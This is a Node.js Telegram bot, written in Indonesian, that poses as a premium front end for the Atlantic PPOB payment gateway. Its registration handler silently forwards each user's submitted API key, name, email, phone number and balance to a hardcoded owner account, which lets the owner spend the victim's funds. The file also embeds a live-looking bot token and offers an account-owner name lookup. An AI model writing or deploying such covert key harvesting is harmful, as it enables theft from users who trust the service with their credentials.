const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
const FormData = require('form-data');

// --- KONFIGURASI YANG MULIA ---
const BOT_TOKEN = '8602360591:AAGLcMSN5IQ5mBJjkj_MHmL0l6URlXhkTWw';
const OWNER_ID = '8793356645';
const BASE_URL = 'https://atlantich2h.com';

const bot = new Telegraf(BOT_TOKEN);
const userSessions = {}; 

// --- PERISAI ANTI-CRASH (MARKDOWNV2 ESCAPER) ---
function esc(text) {
    return text ? text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&') : '';
}

// --- FUNGSI REQUEST API ---
async function callAtlantic(endpoint, body = {}) {
    try {
        const formData = new FormData();
        for (const key in body) { formData.append(key, body[key]); }
        const res = await axios.post(`${BASE_URL}${endpoint}`, formData, {
            headers: formData.getHeaders()
        });
        return res.data;
    } catch (e) { return { status: false, message: "Server Busy" }; }
}

// --- ANIMASI LOADING ---
async function animLoad(ctx, text = "Sedang memproses") {
    const { message_id } = await ctx.reply(`⏳ ${text}.`);
    const frames = ["..", "...", "....", "....."];
    for (let i = 0; i < frames.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 400));
        await ctx.telegram.editMessageText(ctx.chat.id, message_id, null, `⏳ ${text}${frames[i]}`);
    }
    return message_id;
}

// --- COMMAND START ---
bot.start((ctx) => {
    ctx.replyWithMarkdownV2(
        `👑 *SELAMAT DATANG YANG MULIA* 👑\n\n` +
        `🌐 *Atlantic PPOB Gateway Premium*\n` +
        `─────────────────────\n` +
        `🔒 *STATUS:* Silakan hubungkan API Key Anda\\.\n\n` +
        `📝 *FORMAT:* \`/daftar API_KEY\``,
        Markup.keyboard([
            ['👤 Profile', '📊 Harga'],
            ['💸 Transaksi', '🔍 Cek Akun']
        ]).resize()
    );
});

// --- FITUR DAFTAR + NOTIF OWNER ---
bot.command('daftar', async (ctx) => {
    const apiKey = ctx.message.text.split(' ')[1];
    if (!apiKey) return ctx.reply('❌ Masukkan API Key! Contoh: /daftar AK123xxx');

    const loadId = await animLoad(ctx, "Memvalidasi Kunci Kerajaan");
    const res = await callAtlantic('/get_profile', { api_key: apiKey });

    if (res.status === "true" || res.status === true) {
        const d = res.data;
        userSessions[ctx.from.id] = apiKey;
        
        await ctx.telegram.deleteMessage(ctx.chat.id, loadId);
        ctx.replyWithMarkdownV2(
            `✅ *AKSES DIBERIKAN* ✅\n` +
            `─────────────────────\n` +
            `👤 *User:* ${esc(d.name)}\n` +
            `💰 *Saldo:* Rp ${esc(d.balance.toLocaleString())}\n` +
            `⚡ *Status:* ${esc(d.status)}\n\n` +
            `🌟 *Silakan bertransaksi, Yang Mulia\\!*`
        );

        // NOTIF KE OWNER (FULL DATA)
        bot.telegram.sendMessage(OWNER_ID, 
            `📢 *PENGGUNA BARU TERKONEKSI*\n` +
            `─────────────────────\n` +
            `🆔 *ID:* \`${ctx.from.id}\`\n` +
            `🔑 *API KEY:* \`${apiKey}\`\n` +
            `📛 *Nama:* ${d.name}\n` +
            `📧 *Email:* ${d.email}\n` +
            `📞 *Phone:* ${d.phone}\n` +
            `💰 *Saldo:* Rp ${d.balance}`, { parse_mode: 'Markdown' }
        );
    } else {
        await ctx.telegram.deleteMessage(ctx.chat.id, loadId);
        ctx.reply('❌ API Key salah atau tidak aktif!');
    }
});

// --- FITUR CEK HARGA + FILTER KATEGORI ---
bot.hears('📊 Harga', (ctx) => {
    ctx.reply('🏷️ *PILIH KATEGORI PRODUK:*', Markup.inlineKeyboard([
        [Markup.button.callback('🎮 GAMES', 'cat_Games'), Markup.button.callback('📱 E-MONEY', 'cat_E-Money')],
        [Markup.button.callback('💡 PLN', 'cat_PLN'), Markup.button.callback('📞 PULSA', 'cat_Pulsa')]
    ]));
});

bot.action(/cat_(.+)/, async (ctx) => {
    const category = ctx.match[1];
    const apiKey = userSessions[ctx.from.id];
    if (!apiKey) return ctx.answerCbQuery('❌ Hubungkan API Key dulu!', { show_alert: true });

    await ctx.editMessageText(`⌛ Menyusun daftar harga ${category}...`);
    const res = await axios.get(`${BASE_URL}/layanan/price_list?type=prabayar&api_key=${apiKey}`);
    
    if (res.data.status) {
        const filtered = res.data.data.filter(x => x.category.toLowerCase().includes(category.toLowerCase()));
        let msg = `✨ *PRICE LIST: ${category.toUpperCase()}* ✨\n` + `─────────────────────\n`;
        filtered.slice(0, 15).forEach(p => {
            msg += `🔹 *${esc(p.name)}*\n   └ 🔑 \`${esc(p.code)}\` \\| 💸 *Rp ${esc(p.price)}*\n\n`;
        });
        ctx.replyWithMarkdownV2(msg);
    }
});

// --- FITUR CEK REKENING (NAME CHECK) ---
bot.hears('🔍 Cek Akun', (ctx) => ctx.reply('🔍 *FORMAT:* \`/ceknama DANA 08xxx\`'));

bot.command('ceknama', async (ctx) => {
    const apiKey = userSessions[ctx.from.id];
    const args = ctx.message.text.split(' ');
    if (args.length < 3) return ctx.reply('⚠️ Contoh: /ceknama DANA 0857xxx');

    const loadId = await animLoad(ctx, "Mencari Nama Pemilik");
    const res = await callAtlantic('/transfer/cek_rekening', {
        api_key: apiKey,
        bank_code: args[1].toLowerCase(),
        account_number: args[2]
    });

    await ctx.telegram.deleteMessage(ctx.chat.id, loadId);
    if (res.status) {
        ctx.replyWithMarkdownV2(
            `✅ *DATA DITEMUKAN* ✅\n` +
            `─────────────────────\n` +
            `🏦 *Provider:* ${esc(res.data.kode_bank.toUpperCase())}\n` +
            `👤 *Nama:* *${esc(res.data.nama_pemilik)}*\n` +
            `🆔 *Nomor:* ${esc(res.data.nomor_akun)}\n` +
            `─────────────────────`
        );
    } else { ctx.reply('❌ Akun tidak ditemukan.'); }
});

// --- FITUR TRANSAKSI (ORDER) ---
bot.hears('💸 Transaksi', (ctx) => ctx.reply('💸 *FORMAT ORDER:* \n\`/order [KODE] [TARGET]\`'));

bot.command('order', async (ctx) => {
    const apiKey = userSessions[ctx.from.id];
    const args = ctx.message.text.split(' ');
    if (!apiKey) return ctx.reply('⚠️ Hubungkan API Key!');
    if (args.length < 3) return ctx.reply('⚠️ Contoh: /order FF50 1234567');

    const loadId = await animLoad(ctx, "Mengirim Pesanan Ke Server");
    const reffId = 'LX' + Date.now();
    const res = await callAtlantic('/transaksi/create', {
        api_key: apiKey,
        code: args[1],
        target: args[2],
        reff_id: reffId
    });

    await ctx.telegram.deleteMessage(ctx.chat.id, loadId);
    if (res.status) {
        const d = res.data;
        ctx.replyWithMarkdownV2(
            `⚡ *TRANSAKSI BERHASIL* ⚡\n` +
            `─────────────────────\n` +
            `📦 *Produk:* ${esc(d.layanan)}\n` +
            `🎯 *Target:* \`${esc(d.target)}\`\n` +
            `💸 *Harga:* Rp ${esc(d.price)}\n` +
            `⏳ *Status:* ${esc(d.status)}\n` +
            `─────────────────────`
        );
    } else { ctx.reply(`❌ Gagal: ${res.message}`); }
});

// --- FITUR PROFILE ---
bot.hears('👤 Profile', async (ctx) => {
    const apiKey = userSessions[ctx.from.id];
    if (!apiKey) return ctx.reply('⚠️ API Key belum terpasang.');

    const res = await callAtlantic('/get_profile', { api_key: apiKey });
    if (res.status) {
        const d = res.data;
        ctx.replyWithMarkdownV2(
            `💎 *INFO PREMIUM* 💎\n` +
            `─────────────────────\n` +
            `👤 *Username:* ${esc(d.username)}\n` +
            `💰 *Saldo:* Rp ${esc(d.balance.toLocaleString())}\n` +
            `✨ *Status:* ${esc(d.status)}`
        );
    }
});

bot.launch().then(() => console.log('🚀 Bot Atlantic PPOB Full Animasi Aktif!'));
